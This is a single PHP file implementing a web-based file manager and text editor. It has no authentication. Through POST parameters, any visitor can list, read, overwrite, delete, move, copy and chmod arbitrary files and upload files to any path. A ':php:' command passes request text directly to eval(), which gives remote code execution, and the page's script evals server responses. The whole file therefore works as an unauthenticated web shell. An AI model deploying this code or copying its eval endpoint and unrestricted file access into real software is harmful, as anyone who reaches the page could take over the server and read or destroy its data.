<?php
//disable magic quotes!!
error_reporting(E_ALL^E_NOTICE);
$tf = explode('/', $_SERVER["SCRIPT_NAME"]);
$tf = $tf[count($tf)-1];
if (get_magic_quotes_gpc())
{
 $process = array(&$_GET, &$_POST, &$_COOKIE, &$_REQUEST);
 while (list($key, $val) = each($process))
 {
  foreach ($val as $k => $v)
  {
   unset($process[$key][$k]);
   if (is_array($v))
   {
    $process[$key][stripslashes($k)] = $v;
    $process[] = &$process[$key][stripslashes($k)];
   }
   else
   {
    $process[$key][stripslashes($k)] = stripslashes($v);
   }
  }
 }
 unset($process);
}
//
//
function makeUTF($content)
{
 if(!mb_check_encoding($content, 'UTF-8') OR !($content === mb_convert_encoding(mb_convert_encoding($content, 'UTF-32', 'UTF-8' ), 'UTF-8', 'UTF-32')))
 {
  $content = mb_convert_encoding($content, 'UTF-8');
 }
 return $content;
} 
///
///
function rrmdir($dir)
{
 foreach(glob($dir . '/*') as $file)
 {
  if(is_dir($file))
  rrmdir($file);
  else
  unlink($file);
 }
 rmdir($dir);
}
function rm($what)
{
 if (is_dir($what))
 {
  rrmdir($what);
  return (!is_dir($what));
 }
 else
 {
  return unlink($what);
 }
}
function mv($what, $to)
{
 return rename($what, $to);
}
function rmkdir($pathname)
{
 is_dir(dirname($pathname)) || rmkdir(dirname($pathname));
 return is_dir($pathname) || @mkdir($pathname);
}
function cp($what, $to)
{
 if (file_exists($to)) rrmdir($to);
 if (is_dir($what))
 {
  rmkdir($to);
  $files = scandir($what);
  foreach ($files as $file)
  if ($file != "." && $file != "..") cp("$what/$file", "$to/$file");
 }
 else if (file_exists($what)) copy($what, $to);
}
function ls($dir)
{
 if ($handle = opendir($dir))
 {
  $dirs = array();
  $files = array();
  while (false !== ($entry = readdir($handle)))
  {
   if ($entry!="." && $entry!="..")
   {
    if (is_dir("$dir/$entry"))
    $dirs[] = "[".$entry."]";
    else $files[] = $entry;
   }
  }
  if (count($dirs) || count($files))
  {
   $dl = implode("\n", $dirs);
   $fl = implode("\n", $files);
   $ret = "";
   if ($dl)
   $ret .= $dl;
   if ($fl && $dl)
   $ret .= "\n".$fl;
   else if ($fl)
   $ret .= $fl;
   return $ret;
  }
  else return "[directory empty]";
 }
 else return false;
}
if ($_FILES['file'])
{
 $tname = $_POST['chosen'];
 if(!($tname && (strpos($tname, ":")===FALSE)))
 {
  $tname = $_FILES['file']['name'];
 }
 move_uploaded_file($_FILES['file']['tmp_name'], $tname);
 echo('<script>window.top.finishUploading('.json_encode($tname).');</script>');
}
if ($_GET['uploadframe'])
{
 echo('<style>body {background-color: black; color: white; font-size: 12px; font-family: Arial;}</style><br><center><form enctype="multipart/form-data" action="'.$tf.'?uploadframe=1" method="post" id="uplform">Upload file: &nbsp;<input type="hidden" name="chosen" value="" id="chosen"><input type="file" style="background-color: black; color: white;" name="file" onchange="document.getElementById(\'chosen\').value=window.top.document.getElementById(\'file\').value.split(\':\')[0];window.top.startUploading();document.forms[\'uplform\'].submit();return false;"></form></center>');
 exit;
}
if ($_POST['file'] && $_POST['delete'])
{
 $fname = $_POST['file'];
 if (strpos($fname, ":")!==FALSE)
 {
  $fname = substr($fname, 0, strpos($fname, ':'));
 }
 $dorf = (is_dir($fname))?('Directory'):('File');
 if (rm($fname))
 echo('setStatus("'.$dorf.' deleted!");');
 else
 echo('setStatus("<font color=\"red\">Error!</font>");');
 exit;
}
if ($_POST['file'] && $_POST['save'])
{
 $fname = $_POST['file'];
 $descharset="";
 if (strpos($fname, ':')!==FALSE)
 {
  $cm = explode(':', $fname);
  $fname = $cm[0];
  if ($cm[1] == "c")
  {
   $descharset = substr($_POST['file'], strpos($_POST['file'], ':c:')+3);
  }
 }
 $file = fopen($fname, "w");
 if (!$file)
 {
  echo('setStatus("<font color=\"red\">Error!</font>");document.getElementById("edit").readOnly=false;');
 }
 else
 {
  $save = $_POST['save']; 
  fwrite($file, (($descharset)?(iconv("UTF-8", $descharset, $save)):($save)));
  fclose($file);
  echo('setStatus("<font color=\"green\">Saved!</font>'.(($descharset)?(' [charset: '.$descharset.']'):('')).'");document.getElementById("edit").readOnly=false;');
 }
 exit;
}
if ($_POST['file'])
{
 $fname = $_POST['file'];
 if (strpos($fname, ':')!==FALSE)
 {
  $realname = substr($fname, 0, strpos($fname, ':'));
  $cm = explode(':', $fname);
  if ($cm[1] == "chmod")
  {
   if ($cm[2])
   {
    if (chmod($realname, intval($cm[2], 8)))
    echo('setStatus("<font color=\"green\">Permissions changed!</font>");document.getElementById("edit").readOnly=false;');
    else
    echo('setStatus("<font color=\"red\">Error!</font>");document.getElementById("edit").readOnly=false;');
   }
   else
   {
    echo('setStatus("Current file permissions: '.substr(sprintf('%o', fileperms($realname)), -4).'");document.getElementById("edit").readOnly=false;');
   }
  }
  else if ($cm[1] == "rm")
  {
   echo(' var f = confirm("Delete this '.((is_dir($realname))?('directory'):('file')).'?");
  if (f)
  {
   postAsynchronousAjax("'.$tf.'", "file="+urlencode(document.getElementById("file").value)+"&delete=1");
   window.ctrldown=0;
  }');
   exit;
  }
  else if ($cm[1] == "php")
  {
   eval('$result = '.substr($fname, strpos($fname, ':php:')+5).';');
   echo('document.getElementById("edit").value='.json_encode($result).';');
   exit;
  }
  else if ($cm[1] == "pwd")
  {
   echo('document.getElementById("file").value='.json_encode(makeUTF(getcwd())).';');
   exit;
  }
  else if ($cm[1] == "upload")
  {
   echo('startUploadMode();');
   exit;
  }
  else if (($cm[1] == "mv") && $cm[2])
  {
   if (mv($cm[0], $cm[2]))
   echo('setStatus("<font color=\"green\">Successfully moved!</font>");');
   else
   echo('setStatus("<font color=\"red\">Error!</font>");');
  }
  else if (($cm[1] == "cp") && $cm[2])
  {
   cp($cm[0], $cm[2]);
   if ((is_dir($cm[0])==is_dir($cm[2])) && (is_file($cm[0])==is_file($cm[2])))
   echo('setStatus("<font color=\"green\">Successfully copied!</font>");');
   else
   echo('setStatus("<font color=\"red\">Error!</font>");');
  }
  else if ($cm[1] == "mkdir")
  {
   if (rmkdir($cm[0]))
   echo('setStatus("<font color=\"green\">Directory was created successfully!</font>");');
   else
   echo('setStatus("<font color=\"red\">Error!</font>");');
  }
  if ($cm[1]!="c")
  exit;
 }
 if (is_dir($fname))
 {
  if (($m = makeUTF(ls($fname))))
  {
   echo('document.getElementById("edit").value='.json_encode($m).';setStatus("Listing a directory");');
  }
  else
  echo('setStatus("<font color=\"red\">Cannot list directory!</font>");');
  exit;
 }
 $descharset="";
 if ($cm && $cm[1]=="c" && $cm[2])
 {
  $fname = substr($fname, 0, strpos($fname, ':'));
  $descharset = $cm[2];
 }
 $file = fopen($fname, "r");
 if ($file)
 {
  $fcontents = (($descharset)?(iconv($descharset, "UTF-8", fread($file, filesize($fname)))):(fread($file, filesize($fname))));
  fclose($file);
  if ($fcontents)
  {
   if (json_encode($fcontents)=="null")
   echo('document.getElementById("edit").readOnly=false;document.getElementById("edit").value="[invalid encoding or binary]";document.getElementById("edit").focus();');
   else
   echo('document.getElementById("edit").readOnly=false;document.getElementById("edit").value='.json_encode($fcontents).';document.getElementById("edit").focus();');
  }
 }
 else
 echo('document.getElementById("edit").readOnly=false;document.getElementById("edit").value="";document.getElementById("edit").focus();');
 exit;
}

echo('<style>body {background-color: black; color: white; font-size: 12px;}</style><script>'); ?>
window.onload = setthesize;
window.onresize = setthesize;
window.ctrldown = false;
window.ctimeout = null;
window.uplnow = false;
function setthesize()
{
 document.getElementById("file").style.width=(window.innerWidth-20)+"px";
 document.getElementById("edit").style.height=(window.innerHeight-60)+"px";
 document.getElementById("edit").style.width=(window.innerWidth-20)+"px";
 document.getElementById("uploadframe").style.top=(window.innerHeight/2)-(document.getElementById("uploadframe").height/2)+"px";
 document.getElementById("uploadframe").style.left=(window.innerWidth/2)-(document.getElementById("uploadframe").width/2)+"px";
 document.getElementById("uploadframe1").style.top=(window.innerHeight/2)-(parseInt(document.getElementById("uploadframe1").style.height)/2)+"px";
 document.getElementById("uploadframe1").style.left=(window.innerWidth/2)-(parseInt(document.getElementById("uploadframe1").style.width)/2)+"px";
}
function postAsynchronousAjax(url, values)
{
 var xmlhttp;
 if (window.XMLHttpRequest)
 {
  xmlhttp=new XMLHttpRequest()
  xmlhttp.open("POST",url,true);
  xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xmlhttp.send(values);
  xmlhttp.onreadystatechange=function()
  {
   if (xmlhttp.readyState==4)
   {
    if (xmlhttp.status==200)
    {
     eval(xmlhttp.responseText);
    }
   }
  }
 }
 else if (window.ActiveXObject)
 {
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP")
  if (xmlhttp)
  {
   xmlhttp.open("POST",url,true);
   xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
   xmlhttp.send(values);
   xmlhttp.onreadystatechange=function()
   {
    if (xmlhttp.readyState==4)
    {
     if (xmlhttp.status==200)
     {
      eval(xmlhttp.responseText);
     }
    }
   }
  }
 }
}
function urlencode (str)
{
 return encodeURIComponent(str).replace(/!/g, '%21').replace(/'/g, '%27').replace(/\(/g, '%28').
 replace(/\)/g, '%29').replace(/\*/g, '%2A').replace(/%20/g, '+');
}
function loadfile(e, el)
{
 if (e.keyCode==13)
 postAsynchronousAjax("<?php echo($tf); ?>", "file="+urlencode(el.value));
}
function tellLine(el)
{
 var ln = el.value.substr(0, el.selectionStart).split("\n").length;
 setStatus("Line: "+ln);
}
function setStatus(str)
{
 if (window.ctimeout!=null)
 window.clearTimeout(window.ctimeout);
 document.getElementById("statusbar").innerHTML=str;
 window.ctimeout = window.setTimeout("clearStatus()", 1000);
}
function clearStatus()
{
 document.getElementById("statusbar").innerHTML="";
}
function ckeydown(e)
{
 if (e.keyCode==17)
 {
  window.ctrldown=true;
 }
 else if (window.ctrldown && e.keyCode==83)
 {
  postAsynchronousAjax("<?php echo($tf); ?>", "file="+urlencode(document.getElementById("file").value)+"&save="+urlencode(document.getElementById("edit").value));
  document.getElementById("edit").readOnly=true;
  e.stopPropagation();
  e.preventDefault();
  window.ctrldown=0;
 }
 else if (window.ctrldown && e.keyCode==82)
 {
  e.stopPropagation();
  e.preventDefault();
  var f = confirm("Delete this file?");
  if (f)
  {
   postAsynchronousAjax("<?php echo($tf); ?>", "file="+urlencode(document.getElementById("file").value)+"&delete=1");
   window.ctrldown=0;
  }
 }
 else if (window.ctrldown && e.keyCode==85)
 {
  e.stopPropagation();
  e.preventDefault();
  startUploadMode();
 }
}
function ckeyup(e)
{
 if (e.keyCode==17)
 {
  window.ctrldown=false;
 }
}
function startUploadMode()
{
 document.getElementById("uploadframe").style.display="block";
 document.getElementById("uploadframe1").style.display="none";
 document.getElementById("uploadoverlay").style.display="block";
}
function startUploading()
{
 document.getElementById("uploadframe").style.display="none";
 document.getElementById("uploadframe1").style.display="block";
 window.uplnow=true;
}
function finishUploading(name)
{
 window.uplnow=0;
 document.getElementById("file").value=name;
 finishUploadMode();
 setStatus("<font color=green>Upload successful!</font>");
}
function finishUploadMode()
{
 if (window.uplnow)
 {
  var f = confirm("Abort file upload?");
  if (f)
  {
   window.uplnow = false;
   document.getElementById("uploadframe").style.display="none";
   document.getElementById("uploadframe1").style.display="none";
   document.getElementById("uploadoverlay").style.display="none";
   document.getElementById("uploadframe").reload();
   return true;
  }
  else
  return false;
 }
 document.getElementById("uploadframe").style.display="none";
 document.getElementById("uploadframe1").style.display="none";
 document.getElementById("uploadoverlay").style.display="none";
}
<?php echo('</script><input type="text" id="file" onkeydown="loadfile(event, this);" spellcheck="false" style="background-color: black; color: white;"><textarea id="edit" onkeydown="ckeydown(event);" onkeyup="ckeyup(event);" onclick="tellLine(this);" style="background-color: black; color: white;" spellcheck="false"></textarea><div id="statusbar" style="font-family: Arial; font-size: 11px; width: 100%; border-top: 1px solid white; margin-top: 4px;">&nbsp;</div>');?>
<script>
document.getElementById("file").focus();
</script>
<div id="uploadoverlay" style="display: none; width: 100%; height: 100%; position: absolute; left: 0px; top: 0px; background-color: rgba(0, 0, 0, 0.7);" onclick="finishUploadMode();"></div>
<iframe src="<?php echo($tf); ?>?uploadframe=1" style="display: none; border: 1px solid grey; position: absolute;" id="uploadframe" width="400" height="100"></iframe>
<div id="uploadframe1" style="display: none; border: 1px solid grey; position: absolute; width: 400px; height: 100px; font-size: 12px; font-family: Arial;" id="uploadframe">Upload in progress...</div>
